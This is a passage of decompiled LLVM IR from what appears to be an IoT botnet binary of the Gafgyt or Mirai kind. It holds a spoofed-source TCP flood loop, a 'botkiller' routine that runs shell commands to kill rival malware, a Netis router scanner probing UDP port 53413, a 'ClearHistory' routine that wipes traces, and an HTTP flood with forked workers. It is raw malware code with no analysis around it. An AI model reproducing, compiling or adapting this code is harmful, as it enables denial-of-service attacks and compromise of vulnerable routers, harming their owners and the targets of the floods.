  %v1_ead8 = call i32 @__GI_htonl(i32 %v1_eacc)
  store i32 %v1_ead8, i32* %r2.global-to-local, align 4
  %v1_eae4 = add i32 %arg6, 20
  %v1_eae8 = load i32, i32* @sp, align 4
  %v2_eae8 = inttoptr i32 %v1_eae8 to i32*
  store i32 %v1_eae4, i32* %v2_eae8, align 4
  %v0_eaf0 = load i32, i32* @r4, align 4
  %v4_eaf8 = inttoptr i32 %v3_ea9c to i8*
  %v5_eaf8 = call i32 @makeIPPacket(i8* %v4_eaf8, i32 %v0_eaf0, i32 %v1_ead8, i32 6)
  %v0_eafc = call i32 @rand_cmwc()
  %v3_eb08 = urem i32 %v0_eafc, 65536
  store i32 %v3_eb08, i32* %r2.global-to-local, align 4
  %v1_eb10 = trunc i32 %v0_eafc to i16
  store i16 %v1_eb10, i16* %v5_eac0, align 4
  %v0_eb14 = call i32 @rand_cmwc()
  %v2_eb20 = add i32 %v3_ea9c, 24
  %v3_eb20 = inttoptr i32 %v2_eb20 to i32*
  store i32 %v0_eb14, i32* %v3_eb20, align 8
  %v2_eb2c = add i32 %v3_ea9c, 28
  %v3_eb2c = inttoptr i32 %v2_eb2c to i32*
  store i32 0, i32* %v3_eb2c, align 4
  store i32 %v1_eabc, i32* %r2.global-to-local, align 4
  %v1_eb34 = add i32 %v3_ea9c, 32
  %v2_eb34 = inttoptr i32 %v1_eb34 to i8*
  %v3_eb34 = load i8, i8* %v2_eb34, align 8
  %v1_eb40 = urem i8 %v3_eb34, 16
  %v1_eb44 = or i8 %v1_eb40, 80
  store i8 %v1_eb44, i8* %v2_eb34, align 8
  %v3_eb54 = load i32, i32* %stack_var_0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1e874.401 to i32), i32* @r1, align 4
  %v3_eb60 = inttoptr i32 %v3_eb54 to i8*
  %v4_eb60 = call i32 @__GI_strcoll(i8* %v3_eb60, i32 ptrtoint ([4 x i8]* @global_var_1e874.401 to i32))
  %v2_eb68 = icmp eq i32 %v4_eb60, 0
  br i1 %v2_eb68, label %dec_label_pc_eb70, label %dec_label_pc_ec28

dec_label_pc_eb70:                                ; preds = %dec_label_pc_ea68
  store i32 %v1_eabc, i32* %r2.global-to-local, align 4
  %v1_eb74 = add i32 %v3_ea9c, 33
  %v2_eb74 = inttoptr i32 %v1_eb74 to i8*
  %v3_eb74 = load i8, i8* %v2_eb74, align 1
  %v1_eb84 = or i8 %v3_eb74, 2
  store i8 %v1_eb84, i8* %v2_eb74, align 1
  store i32 %v1_eabc, i32* %r2.global-to-local, align 4
  %v3_eb98 = load i8, i8* %v2_eb74, align 1
  %v1_eba8 = or i8 %v3_eb98, 4
  store i8 %v1_eba8, i8* %v2_eb74, align 1
  store i32 %v1_eabc, i32* %r2.global-to-local, align 4
  %v3_ebbc = load i8, i8* %v2_eb74, align 1
  %v1_ebcc = or i8 %v3_ebbc, 1
  store i8 %v1_ebcc, i8* %v2_eb74, align 1
  store i32 %v1_eabc, i32* %r2.global-to-local, align 4
  %v3_ebe0 = load i8, i8* %v2_eb74, align 1
  %v1_ebf0 = or i8 %v3_ebe0, 16
  store i8 %v1_ebf0, i8* %v2_eb74, align 1
  store i32 %v1_eabc, i32* %r2.global-to-local, align 4
  %v3_ec04 = load i8, i8* %v2_eb74, align 1
  %v1_ec14 = or i8 %v3_ec04, 8
  store i8 %v1_ec14, i8* %v2_eb74, align 1
  br label %dec_label_pc_edd0

dec_label_pc_ec28:                                ; preds = %dec_label_pc_ea68
  %v3_ec28 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_ec28, i32* @r0, align 4
  %v2_ec34 = call i32 @__GI_strtok(i32 %v3_ec28, i32 ptrtoint (i32* @global_var_1e878.403 to i32))
  %v2_edc818 = icmp eq i32 %v2_ec34, 0
  br i1 %v2_edc818, label %dec_label_pc_edd0, label %dec_label_pc_ec44.lr.ph

dec_label_pc_ec44.lr.ph:                          ; preds = %dec_label_pc_ec28
  %v1_ec64 = add i32 %v3_ea9c, 33
  %v2_ec64 = inttoptr i32 %v1_ec64 to i8*
  br label %dec_label_pc_ec44

dec_label_pc_ec44:                                ; preds = %dec_label_pc_ec44.lr.ph, %dec_label_pc_edb0
  %storemerge1319 = phi i32 [ %v2_ec34, %dec_label_pc_ec44.lr.ph ], [ %v2_edb8, %dec_label_pc_edb0 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1e87c.405 to i32), i32* @r1, align 4
  %v3_ec50 = inttoptr i32 %storemerge1319 to i8*
  %v4_ec50 = call i32 @__GI_strcoll(i8* %v3_ec50, i32 ptrtoint ([4 x i8]* @global_var_1e87c.405 to i32))
  %v2_ec58 = icmp eq i32 %v4_ec50, 0
  br i1 %v2_ec58, label %dec_label_pc_ec60, label %dec_label_pc_ec88

dec_label_pc_ec60:                                ; preds = %dec_label_pc_ec44
  %v3_ec64 = load i8, i8* %v2_ec64, align 1
  %v4_ec6c = zext i8 %v3_ec64 to i32
  %v1_ec74 = or i32 %v4_ec6c, 2
  store i32 %v1_ec74, i32* %r2.global-to-local, align 4
  %v1_ec80 = trunc i32 %v1_ec74 to i8
  store i8 %v1_ec80, i8* %v2_ec64, align 1
  br label %dec_label_pc_edb0

dec_label_pc_ec88:                                ; preds = %dec_label_pc_ec44
  store i32 ptrtoint ([4 x i8]* @global_var_1e880.407 to i32), i32* @r1, align 4
  %v4_ec94 = call i32 @__GI_strcoll(i8* %v3_ec50, i32 ptrtoint ([4 x i8]* @global_var_1e880.407 to i32))
  %v2_ec9c = icmp eq i32 %v4_ec94, 0
  br i1 %v2_ec9c, label %dec_label_pc_eca4, label %dec_label_pc_eccc

dec_label_pc_eca4:                                ; preds = %dec_label_pc_ec88
  %v3_eca8 = load i8, i8* %v2_ec64, align 1
  %v4_ecb0 = zext i8 %v3_eca8 to i32
  %v1_ecb8 = or i32 %v4_ecb0, 4
  store i32 %v1_ecb8, i32* %r2.global-to-local, align 4
  %v1_ecc4 = trunc i32 %v1_ecb8 to i8
  store i8 %v1_ecc4, i8* %v2_ec64, align 1
  br label %dec_label_pc_edb0

dec_label_pc_eccc:                                ; preds = %dec_label_pc_ec88
  store i32 ptrtoint ([4 x i8]* @global_var_1e884.409 to i32), i32* @r1, align 4
  %v4_ecd8 = call i32 @__GI_strcoll(i8* %v3_ec50, i32 ptrtoint ([4 x i8]* @global_var_1e884.409 to i32))
  %v2_ece0 = icmp eq i32 %v4_ecd8, 0
  br i1 %v2_ece0, label %dec_label_pc_ece8, label %dec_label_pc_ed10

dec_label_pc_ece8:                                ; preds = %dec_label_pc_eccc
  %v3_ecec = load i8, i8* %v2_ec64, align 1
  %v4_ecf4 = zext i8 %v3_ecec to i32
  %v1_ecfc = or i32 %v4_ecf4, 1
  store i32 %v1_ecfc, i32* %r2.global-to-local, align 4
  %v1_ed08 = trunc i32 %v1_ecfc to i8
  store i8 %v1_ed08, i8* %v2_ec64, align 1
  br label %dec_label_pc_edb0

dec_label_pc_ed10:                                ; preds = %dec_label_pc_eccc
  store i32 ptrtoint ([4 x i8]* @global_var_1e888.411 to i32), i32* @r1, align 4
  %v4_ed1c = call i32 @__GI_strcoll(i8* %v3_ec50, i32 ptrtoint ([4 x i8]* @global_var_1e888.411 to i32))
  %v2_ed24 = icmp eq i32 %v4_ed1c, 0
  br i1 %v2_ed24, label %dec_label_pc_ed2c, label %dec_label_pc_ed54

dec_label_pc_ed2c:                                ; preds = %dec_label_pc_ed10
  %v3_ed30 = load i8, i8* %v2_ec64, align 1
  %v4_ed38 = zext i8 %v3_ed30 to i32
  %v1_ed40 = or i32 %v4_ed38, 16
  store i32 %v1_ed40, i32* %r2.global-to-local, align 4
  %v1_ed4c = trunc i32 %v1_ed40 to i8
  store i8 %v1_ed4c, i8* %v2_ec64, align 1
  br label %dec_label_pc_edb0

dec_label_pc_ed54:                                ; preds = %dec_label_pc_ed10
  store i32 ptrtoint ([4 x i8]* @global_var_1e88c.413 to i32), i32* @r1, align 4
  %v4_ed60 = call i32 @__GI_strcoll(i8* %v3_ec50, i32 ptrtoint ([4 x i8]* @global_var_1e88c.413 to i32))
  %v2_ed68 = icmp eq i32 %v4_ed60, 0
  br i1 %v2_ed68, label %dec_label_pc_ed70, label %dec_label_pc_ed98

dec_label_pc_ed70:                                ; preds = %dec_label_pc_ed54
  %v3_ed74 = load i8, i8* %v2_ec64, align 1
  %v4_ed7c = zext i8 %v3_ed74 to i32
  %v1_ed84 = or i32 %v4_ed7c, 8
  store i32 %v1_ed84, i32* %r2.global-to-local, align 4
  %v1_ed90 = trunc i32 %v1_ed84 to i8
  store i8 %v1_ed90, i8* %v2_ec64, align 1
  br label %dec_label_pc_edb0

dec_label_pc_ed98:                                ; preds = %dec_label_pc_ed54
  %v2_ed9c = load i32, i32* @global_var_28570.50, align 4
  store i32 %storemerge1319, i32* @r2, align 4
  %v3_edac = call i32 @sockprintf(i32 %v2_ed9c, i32 ptrtoint ([18 x i8]* @global_var_1e890.415 to i32))
  br label %dec_label_pc_edb0

dec_label_pc_edb0:                                ; preds = %dec_label_pc_ed70, %dec_label_pc_ed2c, %dec_label_pc_ece8, %dec_label_pc_eca4, %dec_label_pc_ec60, %dec_label_pc_ed98
  store i32 0, i32* @r0, align 4
  %v2_edb8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1e878.403 to i32))
  %v2_edc8 = icmp eq i32 %v2_edb8, 0
  br i1 %v2_edc8, label %dec_label_pc_edd0, label %dec_label_pc_ec44

dec_label_pc_edd0:                                ; preds = %dec_label_pc_edb0, %dec_label_pc_ec28, %dec_label_pc_eb70
  %v0_edd0 = call i32 @rand_cmwc()
  %v1_ede4 = trunc i32 %v0_edd0 to i16
  %v3_ede4 = add i32 %v3_ea9c, 34
  %v4_ede4 = inttoptr i32 %v3_ede4 to i16*
  store i16 %v1_ede4, i16* %v4_ede4, align 2
  %v3_edf0 = add i32 %v3_ea9c, 36
  %v4_edf0 = inttoptr i32 %v3_edf0 to i16*
  store i16 0, i16* %v4_edf0, align 4
  store i32 %v1_eabc, i32* %r2.global-to-local, align 4
  %v3_edfc = add i32 %v3_ea9c, 38
  %v4_edfc = inttoptr i32 %v3_edfc to i16*
  store i16 0, i16* %v4_edfc, align 2
  br i1 %v2_e938, label %dec_label_pc_ee0c, label %dec_label_pc_ee24

dec_label_pc_ee0c:                                ; preds = %dec_label_pc_edd0
  %v0_ee0c = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_ee0c to i16
  br label %dec_label_pc_ee40

dec_label_pc_ee24:                                ; preds = %dec_label_pc_edd0
  %v3_ee2c = urem i32 %arg2, 65536
  %v1_ee34 = call i32 @__GI_htons(i32 %v3_ee2c)
  %extract.t72 = trunc i32 %v1_ee34 to i16
  br label %dec_label_pc_ee40

dec_label_pc_ee40:                                ; preds = %dec_label_pc_ee0c, %dec_label_pc_ee24
  %v0_ee0c.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_ee0c ], [ %extract.t72, %dec_label_pc_ee24 ]
  %v3_ee48 = add i32 %v3_ea9c, 22
  %v4_ee48 = inttoptr i32 %v3_ee48 to i16*
  store i16 %v0_ee0c.sink.off0, i16* %v4_ee48, align 2
  %v2_ee54 = call i32 @tcpcsum(i32 %v3_ea9c, i32 %v1_eabc)
  %v1_ee64 = trunc i32 %v2_ee54 to i16
  store i16 %v1_ee64, i16* %v4_edf0, align 4
  store i32 %v3_ea9c, i32* %r2.global-to-local, align 4
  %v1_ee74 = or i32 %v3_ea9c, 2
  %v2_ee74 = inttoptr i32 %v1_ee74 to i16*
  %v3_ee74 = load i16, i16* %v2_ee74, align 2
  %v4_ee74 = zext i16 %v3_ee74 to i32
  %v2_ee80 = inttoptr i32 %v3_ea9c to i16*
  %v3_ee80 = call i32 @csum(i16* %v2_ee80, i32 %v4_ee74)
  %sext3 = mul i32 %v3_ee80, 65536
  %v1_ee84 = sdiv i32 %sext3, 65536
  store i32 %v1_ee84, i32* %r2.global-to-local, align 4
  %v1_ee90 = trunc i32 %v1_ee84 to i16
  %v3_ee90 = add i32 %v3_ea9c, 10
  %v4_ee90 = inttoptr i32 %v3_ee90 to i16*
  store i16 %v1_ee90, i16* %v4_ee90, align 2
  %v2_ee98 = call i32 @__GI_time(i32* null)
  %v2_eea4 = add i32 %v2_ee98, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_eeb8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_eef8 = add i32 %v3_ea9c, 12
  %v3_eef8 = inttoptr i32 %v2_eef8 to i32*
  %v3_ef10 = or i32 %v3_ea9c, 4
  %v4_ef10 = inttoptr i32 %v3_ef10 to i16*
  br label %dec_label_pc_eeb4

dec_label_pc_eeb4:                                ; preds = %dec_label_pc_efc4, %dec_label_pc_efb8, %dec_label_pc_ee40
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_ee40 ], [ 0, %dec_label_pc_efb8 ], [ %v1_efc8, %dec_label_pc_efc4 ]
  store i32 %v3_ea9c, i32* %r2.global-to-local, align 4
  %v1_eebc = load i32, i32* @sp, align 4
  %v2_eebc = inttoptr i32 %v1_eebc to i32*
  store i32 %v2_eeb8, i32* %v2_eebc, align 4
  %v1_eec4 = load i32, i32* @sp, align 4
  %v2_eec4 = add i32 %v1_eec4, 4
  %v3_eec4 = inttoptr i32 %v2_eec4 to i32*
  store i32 16, i32* %v3_eec4, align 4
  %v0_eecc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_ea6c, i32* %r2.global-to-local, align 4
  %v6_eed8 = call i32 @__libc_sendto(i32 %v3_e9bc, i32 %v0_eecc, i32 %v1_ea6c, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_eee0 = call i32 @GetRandomIP(i32 %storemerge9)
  %v1_eeec = call i32 @__GI_htonl(i32 %v1_eee0)
  store i32 %v1_eeec, i32* %r2.global-to-local, align 4
  store i32 %v1_eeec, i32* %v3_eef8, align 4
  %v0_eefc = call i32 @rand_cmwc()
  %v3_ef08 = urem i32 %v0_eefc, 65536
  store i32 %v3_ef08, i32* %r2.global-to-local, align 4
  %v1_ef10 = trunc i32 %v0_eefc to i16
  store i16 %v1_ef10, i16* %v4_ef10, align 4
  %v0_ef14 = call i32 @rand_cmwc()
  store i32 %v0_ef14, i32* %r2.global-to-local, align 4
  store i32 %v0_ef14, i32* %v3_eb20, align 8
  %v0_ef24 = call i32 @rand_cmwc()
  %v1_ef38 = trunc i32 %v0_ef24 to i16
  store i16 %v1_ef38, i16* %v5_eac0, align 4
  store i32 %v1_eabc, i32* %r2.global-to-local, align 4
  store i16 0, i16* %v4_edf0, align 4
  %v4_ef50 = call i32 @tcpcsum(i32 %v3_ea9c, i32 %v1_eabc)
  %v1_ef60 = trunc i32 %v4_ef50 to i16
  store i16 %v1_ef60, i16* %v4_edf0, align 4
  store i32 %v3_ea9c, i32* %r2.global-to-local, align 4
  %v3_ef70 = load i16, i16* %v2_ee74, align 2
  %v4_ef70 = zext i16 %v3_ef70 to i32
  %v3_ef7c = call i32 @csum(i16* %v2_ee80, i32 %v4_ef70)
  %sext5 = mul i32 %v3_ef7c, 65536
  %v1_ef80 = sdiv i32 %sext5, 65536
  store i32 %v1_ef80, i32* %r2.global-to-local, align 4
  %v1_ef8c = trunc i32 %v1_ef80 to i16
  store i16 %v1_ef8c, i16* %v4_ee90, align 2
  %v9_ef98 = icmp eq i32 %stack_var_-92.0, %arg7
  br i1 %v9_ef98, label %dec_label_pc_efa0, label %dec_label_pc_efc4

dec_label_pc_efa0:                                ; preds = %dec_label_pc_eeb4
  %v2_efa4 = call i32 @__GI_time(i32* null)
  store i32 %v2_efa4, i32* %r2.global-to-local, align 4
  %v8_efb4 = icmp sgt i32 %v2_efa4, %v2_eea4
  br i1 %v8_efb4, label %dec_label_pc_efd4, label %dec_label_pc_efb8

dec_label_pc_efb8:                                ; preds = %dec_label_pc_efa0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_eeb4

dec_label_pc_efc4:                                ; preds = %dec_label_pc_eeb4
  %v1_efc8 = add i32 %stack_var_-92.0, 1
  br label %dec_label_pc_eeb4

dec_label_pc_efd4:                                ; preds = %dec_label_pc_efa0, %dec_label_pc_e974, %dec_label_pc_ea20, %dec_label_pc_e9d4
  %v1_efe0 = phi i32 [ %v3_e984, %dec_label_pc_e974 ], [ %v3_ea30, %dec_label_pc_ea20 ], [ %v3_e9e4, %dec_label_pc_e9d4 ], [ %v2_efa4, %dec_label_pc_efa0 ]
  ret i32 %v1_efe0

; uselistorder directives
  uselistorder i32 %v1_ef80, { 1, 0 }
  uselistorder i32 %v0_eefc, { 1, 0 }
  uselistorder i32 %v1_ee84, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i8* %v2_ec64, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i8* %v2_eb74, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v0_eafc, { 1, 0 }
  uselistorder i32 %v1_eabc, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10 }
  uselistorder i32 %v3_ea9c, { 9, 8, 6, 19, 7, 5, 21, 18, 4, 3, 17, 16, 15, 14, 13, 20, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_ea6c, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 11, 12, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i16*, i32)* @csum, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @__GI_htonl, { 0, 3, 2, 1 }
  uselistorder i32 (i32)* @GetRandomIP, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 5, 4, 3, 2, 1, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_efd4, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_ee40, { 1, 0 }
  uselistorder label %dec_label_pc_edb0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_ec44, { 1, 0 }
  uselistorder label %dec_label_pc_ea68, { 1, 0 }
  uselistorder label %dec_label_pc_e974, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_f010 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_f010, i32* @ip, align 4
  %v2_f02c = ptrtoint i32* %stack_var_-100 to i32
  %v2_f058 = bitcast i32* %stack_var_-100 to i8*
  br label %dec_label_pc_f020

dec_label_pc_f020:                                ; preds = %dec_label_pc_f0cc, %entry
  br label %dec_label_pc_f02c

dec_label_pc_f02c:                                ; preds = %dec_label_pc_f020, %dec_label_pc_f02c
  %storemerge12 = phi i32 [ 0, %dec_label_pc_f020 ], [ %v1_f0b8, %dec_label_pc_f02c ]
  store i32 %v2_f02c, i32* @r3, align 4
  store i32 %v2_f02c, i32* @r0, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1e8a4.417 to i32), i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_f03c = call i32 @memcpy()
  %v4_f048 = mul nuw nsw i32 %storemerge12, 4
  %v5_f048 = add i32 %v4_f048, ptrtoint ([87 x i8*]* @global_var_28094.502 to i32)
  %v6_f048 = inttoptr i32 %v5_f048 to i32*
  %v7_f048 = load i32, i32* %v6_f048, align 4
  store i32 %v7_f048, i32* @r1, align 4
  %v3_f058 = call i32 @strcat(i8* %v2_f058, i32 %v7_f048)
  %v1_f064 = call i32 @__libc_system(i32 %v2_f02c)
  store i32 %v2_f02c, i32* @r3, align 4
  store i32 %v2_f02c, i32* @r0, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1e8b0.504 to i32), i32* @r1, align 4
  store i32 11, i32* @r2, align 4
  %v0_f078 = call i32 @memcpy()
  %v7_f084 = load i32, i32* %v6_f048, align 4
  store i32 %v7_f084, i32* @r1, align 4
  %v3_f094 = call i32 @strcat(i8* %v2_f058, i32 %v7_f084)
  store i32 ptrtoint (i32* @global_var_1e8bc.506 to i32), i32* @r1, align 4
  %v3_f0a4 = call i32 @strcat(i8* %v2_f058, i32 ptrtoint (i32* @global_var_1e8bc.506 to i32))
  %v1_f0b0 = call i32 @__libc_system(i32 %v2_f02c)
  %v1_f0b8 = add nuw nsw i32 %storemerge12, 1
  %v7_f0c8 = icmp slt i32 %v1_f0b8, 9
  br i1 %v7_f0c8, label %dec_label_pc_f02c, label %dec_label_pc_f0cc

dec_label_pc_f0cc:                                ; preds = %dec_label_pc_f02c
  %v1_f0d0 = call i32 @sleep(i32 5)
  br label %dec_label_pc_f020

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 51, { 0, 1, 2, 8, 3, 4, 5, 6, 7 }
  uselistorder i32 50, { 0, 2, 1 }
  uselistorder i32 49, { 0, 2, 1 }
  uselistorder [3 x i8]* @global_var_1d6f8.36, { 1, 0 }
  uselistorder label %dec_label_pc_f02c, { 1, 0 }
}

define i32 @NetisScanner(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 61684, i32* %stack_var_-4, align 4
  %v2_f0f0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f0f0, i32* @fp, align 4
  %v2_f154 = bitcast i32* %stack_var_-40 to i8*
  %v2_f174 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_f0f8

dec_label_pc_f0f8:                                ; preds = %dec_label_pc_f0f8, %entry
  %v3_f104 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 2, i32* %stack_var_-48, align 4
  %v1_f120 = call i32 @__GI_htons(i32 53413)
  %v0_f12c = call i32 @NetisRanges()
  store i32 8, i32* @r2, align 4
  %v3_f154 = call i32 @__GI_memset(i8* %v2_f154, i32 0)
  %v3_f16c = call i32 @strlen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1e8c0.508, i32 0, i32 0))
  %v7_f190 = call i32 @__libc_sendto(i32 %v3_f104, i32 ptrtoint ([16 x i8]* @global_var_1e8c0.508 to i32), i32 %v3_f16c, i32 0, i32 %v2_f174, i32 16)
  %v3_f198 = call i32 @strlen(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1e8d4.510, i32 0, i32 0))
  %v7_f1bc = call i32 @__libc_sendto(i32 %v3_f104, i32 ptrtoint ([3 x i8]* @global_var_1e8d4.510 to i32), i32 %v3_f198, i32 0, i32 %v2_f174, i32 16)
  %v1_f1c4 = call i32 @__GI_close(i32 %v3_f104)
  br label %dec_label_pc_f0f8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder [3 x i8]* @global_var_1e8d4.510, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 4, 3, 0, 2, 1 }
  uselistorder [16 x i8]* @global_var_1e8c0.508, { 1, 0 }
}

define i32 @ClearHistory(i32 %arg1) local_unnamed_addr {
entry:
  %v3_f1d8 = load i32, i32* @fp, align 4
  %v2_f1e4 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_1e974.512 to i32))
  %v2_f1ec = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_1e98c.514 to i32))
  %v2_f1f4 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_1e9ac.516 to i32))
  store i32 %v3_f1d8, i32* @fp, align 4
  ret i32 %v2_f1f4
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-3156 = alloca i32, align 4
  %stack_var_-2632 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v1_f210 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_f210, i32* @ip, align 4
  store i32 61980, i32* %stack_var_-4, align 4
  %v2_f218 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f218, i32* @fp, align 4
  %v2_f238 = ptrtoint i32* %stack_var_-24 to i32
  %v2_f248 = ptrtoint i32* %stack_var_-2632 to i32
  store i32 ptrtoint ([649 x i8*]* @global_var_253ac.820 to i32), i32* @r1, align 4
  store i32 2596, i32* @r3, align 4
  store i32 %v2_f248, i32* @r0, align 4
  store i32 2596, i32* @r2, align 4
  %v0_f260 = call i32 @memcpy()
  %v2_f280 = call i32 @__GI_time(i32* null)
  %v3_f288 = load i32, i32* %stack_var_0, align 4
  %v2_f28c = add i32 %v3_f288, %v2_f280
  %v0_f294 = call i32 @rand()
  %v2_f2b0 = sdiv i32 %v0_f294, 6
  %tmp31 = mul i32 %v2_f2b0, -30
  %v2_f2c8 = add i32 %tmp31, %v0_f294
  %v3_f2dc = mul i32 %v2_f2c8, 4
  %v2_f2e4 = add i32 %v3_f2dc, %v2_f238
  %v2_f2e8 = add i32 %v2_f2e4, -2620
  %v1_f2ec = inttoptr i32 %v2_f2e8 to i32*
  %v2_f2ec = load i32, i32* %v1_f2ec, align 4
  store i32 %v2_f2ec, i32* @r4, align 4
  %v0_f2f0 = call i32 @rand()
  %v2_f310 = srem i32 %v0_f2f0, 674
  %v3_f350 = mul nsw i32 %v2_f310, 4
  %v2_f358 = add i32 %v3_f350, %v2_f238
  %v2_f35c = add i32 %v2_f358, -2608
  %v1_f360 = inttoptr i32 %v2_f35c to i32*
  %v2_f360 = load i32, i32* %v1_f360, align 4
  %v2_f36c = ptrtoint i32* %stack_var_-3156 to i32
  %v0_f370 = load i32, i32* @r4, align 4
  store i32 %v2_f36c, i32* @r0, align 4
  %v8_f388 = call i32 @sprintf(i32 %v2_f36c, i32 ptrtoint ([62 x i8]* @global_var_25dd0.830 to i32), i32 %arg2, i32 %arg4, i32 %v0_f370, i32 %v2_f360, i32 %v2_f310)
  store i32 %v8_f388, i32* @r0, align 4
  %tmp33 = bitcast i32* %stack_var_-3156 to i8*
  %v5_f45040 = icmp sgt i32 %arg6, 0
  br i1 %v5_f45040, label %dec_label_pc_f398, label %dec_label_pc_f454

dec_label_pc_f398:                                ; preds = %entry, %dec_label_pc_f438
  %storemerge141 = phi i32 [ %v1_f43c, %dec_label_pc_f438 ], [ 0, %entry ]
  %v0_f398 = call i32 @__libc_fork()
  store i32 %v0_f398, i32* @r0, align 4
  %v2_f3a0 = icmp eq i32 %v0_f398, 0
  br i1 %v2_f3a0, label %dec_label_pc_f438, label %dec_label_pc_f418

dec_label_pc_f3ac:                                ; preds = %dec_label_pc_f418
  %v4_f3c8 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v2_f3d8 = icmp eq i32 %v4_f3c8, 0
  br i1 %v2_f3d8, label %dec_label_pc_f418, label %dec_label_pc_f3e0

dec_label_pc_f3e0:                                ; preds = %dec_label_pc_f3ac
  %v3_f3f0 = call i32 @strlen(i8* %tmp33)
  %v2_f40c = call i32 @__GI_write(i32 %v4_f3c8, i32 %v2_f36c)
  %v1_f414 = call i32 @__GI_close(i32 %v4_f3c8)
  br label %dec_label_pc_f418

dec_label_pc_f418:                                ; preds = %dec_label_pc_f3ac, %dec_label_pc_f3e0, %dec_label_pc_f398
  %v2_f41c = call i32 @__GI_time(i32* null)
  %v5_f42c = icmp slt i32 %v2_f41c, %v2_f28c
  br i1 %v5_f42c, label %dec_label_pc_f3ac, label %dec_label_pc_f430

dec_label_pc_f430:                                ; preds = %dec_label_pc_f418
  %v1_f434 = call i32 @__GI__exit(i32 1)
  store i32 %v1_f434, i32* @r0, align 4
  br label %dec_label_pc_f438

dec_label_pc_f438:                                ; preds = %dec_label_pc_f398, %dec_label_pc_f430
  %v1_f45c3 = phi i32 [ 0, %dec_label_pc_f398 ], [ %v1_f434, %dec_label_pc_f430 ]
  %v1_f43c = add nuw nsw i32 %storemerge141, 1
  %v5_f450 = icmp slt i32 %v1_f43c, %arg6
  br i1 %v5_f450, label %dec_label_pc_f398, label %dec_label_pc_f454

dec_label_pc_f454:                                ; preds = %dec_label_pc_f438, %entry
  %v1_f45c.lcssa = phi i32 [ %v8_f388, %entry ], [ %v1_f45c3, %dec_label_pc_f438 ]
  ret i32 %v1_f45c.lcssa

; uselistorder directives
  uselistorder i32 %v1_f43c, { 1, 0 }
  uselistorder i32 %v4_f3c8, { 1, 0, 2 }
  uselistorder i32 %v2_f36c, { 1, 0, 2 }
  uselistorder i32 %v0_f294, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ()* @rand, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_f438, { 1, 0 }
